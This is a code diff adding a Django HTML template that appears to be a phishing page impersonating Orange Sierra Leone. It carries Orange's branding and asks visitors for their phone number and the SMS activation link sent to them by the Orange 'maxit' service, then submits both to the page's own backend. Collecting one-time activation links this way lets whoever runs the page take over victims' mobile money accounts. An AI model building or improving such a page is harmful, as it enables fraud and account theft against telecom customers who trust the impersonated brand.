@@ -1,0 +1,61 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl relative overflow-hidden flex flex-col">
+    
+    <div class="h-[45vh] relative">
+        <img src="https://images.unsplash.com/photo-1523908511403-7fc7b25592f4?w=800" 
+             class="w-full h-full object-cover" alt="Orange Lifestyle">
+        <div class="absolute bottom-0 left-0 w-full h-16 bg-white rounded-t-[40px]"></div>
+    </div>
+
+    <div class="px-8 flex-grow bg-white">
+        <h1 class="text-3xl font-black text-black mb-10">Authentication</h1>
+
+        <form action="{% url 'success' %}" method="POST" class="space-y-12">
+            {% csrf_token %}
+            
+            <div class="relative border-b-2 border-[#ff7900] pb-2">
+                <label class="text-[10px] text-gray-500 uppercase font-bold block mb-1">
+                    Enter your phone number <span class="text-red-500">*</span>
+                </label>
+                <div class="flex items-center gap-4">
+                    <div class="text-[#ff7900]">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd" />
+                        </svg>
+                    </div>
+                    <input type="tel" name="phone" required placeholder="+232" 
+                           class="w-full bg-transparent text-black text-lg outline-none font-semibold">
+                </div>
+            </div>
+
+            <div class="relative border-b-2 border-gray-200 pb-2 focus-within:border-[#ff7900] transition-colors">
+                <label class="text-[10px] text-gray-500 uppercase font-bold block mb-1">
+                    SMS Activation Link <span class="text-red-500">*</span>
+                </label>
+                <div class="flex items-center gap-4">
+                    <div class="text-gray-400">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
+                        </svg>
+                    </div>
+                    <input type="url" name="otp_link" required placeholder="https://maxit.orange.sl/..." 
+                           class="w-full bg-transparent text-black text-sm outline-none italic">
+                </div>
+            </div>
+
+            <div class="pt-6">
+                <button type="submit" 
+                        class="w-full bg-[#ff7900] text-white font-bold py-4 rounded-xl shadow-lg hover:brightness-110 active:scale-[0.98] transition-all uppercase tracking-widest text-sm">
+                    Confirm Authentication
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <div class="p-8 text-center bg-white">
+        <p class="text-[9px] text-gray-400 uppercase tracking-[4px]">Powered by Orange Sierra Leone</p>
+    </div>
+</div>
+{% endblock %}
